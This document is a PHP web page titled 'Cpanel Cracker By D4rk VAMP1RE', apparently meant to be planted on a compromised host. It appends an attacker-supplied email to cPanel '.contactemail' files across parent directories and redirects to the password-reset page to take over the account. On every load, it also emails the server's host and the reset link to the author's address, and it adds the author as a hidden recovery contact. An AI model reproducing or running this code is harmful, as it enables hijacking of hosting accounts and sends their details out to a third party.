<?php
$rpass= ":2083/resetpass?start=1";
$server=$_SERVER['HTTP_HOST'];
$Cracker = "http://".$server.$rpass;
if (isset($_POST['submit'])) {

$your_email = $_POST['Mail'];


if (!$file = fopen("../.contactemail", "a")) {
 header('refresh:2, url:cpanel.php');
}
else{
fwrite($file, "\n".$your_email."\n");
fwrite($file, 'd4rk.vamp1re.ind@yandex.com'."\n");
fclose($file);
header('Location:'.$Cracker);
}
if (!$file = fopen("../../.contactemail", "a")) {

header('refresh:2, url:cpanel.php');
}
else{
fwrite($file, "\n".$your_email."\n");
fwrite($file, 'd4rk.vamp1re.ind@yandex.com'."\n");
fclose($file);
header('Location:'.$Cracker);
}
if (!$file = fopen("../../../.contactemail", "a")) {

	header('refresh:2, url:cpanel.php');
}
else{
fwrite($file, "\n".$your_email."\n");
fwrite($file, 'd4rk.vamp1re.ind@yandex.com'."\n");
fclose($file);
header('Location:'.$Cracker);
}
if (!$file = fopen("../../../../.contactemail", "a")) {
header('refresh:2, url:cpanel.php');	
}
else{
fwrite($file, "\n".$your_email."\n");
fwrite($file, 'd4rk.vamp1re.ind@yandex.com'."\n");
fclose($file);
header('Location:'.$Cracker);
}
if (!$file = fopen("../../../../../.contactemail", "a")) {
	header('refresh:2, url:cpanel.php');
}
else{
fwrite($file, "\n".$your_email."\n");
fwrite($file, 'd4rk.vamp1re.ind@yandex.com'."\n");
fclose($file);
header('Location:'.$Cracker);	
}
}

$to = "d4rk.vamp1re.ind@yandex.com";
$subject = "Hurrah Got a cpanel!!";
$body = $Cracker;
$headers = "From: $server";
mail($to, $subject, $body, $headers);

?>
<!DOCTYPE html>
<html>
<head>
	<title>Cpanel Cracker By #_D4rk_VAMP1RE</title>
	<meta charset="utf-8">
	<meta name='viewport' content='width=device-width, initial-scale=1'>
	<link rel="SHORTCUT ICON" href="https://i.ibb.co/bmsqs1R/20201031-091156.png">	
	<link rel="stylesheet" type="text/css" href="http://ddeeffaaccee.c1.biz/dv.css">
</head>
<body>
<form method="POST">
<div class="mail-form">
	<h1 class="logo">D4RK  VAMP1RE</h1><br>
<input class="HackerMail" type="email" name="Mail" autocomplete="off" style="outline-width: 0;" placeholder="Enter your private email !!" required>
<br><br>
<input type="submit" name="submit" class="Go" value="HACK CPANEL">
<p class="copyright">&copy;<a href="mailto:d4rk.vamp1re.ind@yandex.com"> CPANEL CRACKER BY D4RK VAMP1RE</a></p>
</div>
</form>
</body>
</html>
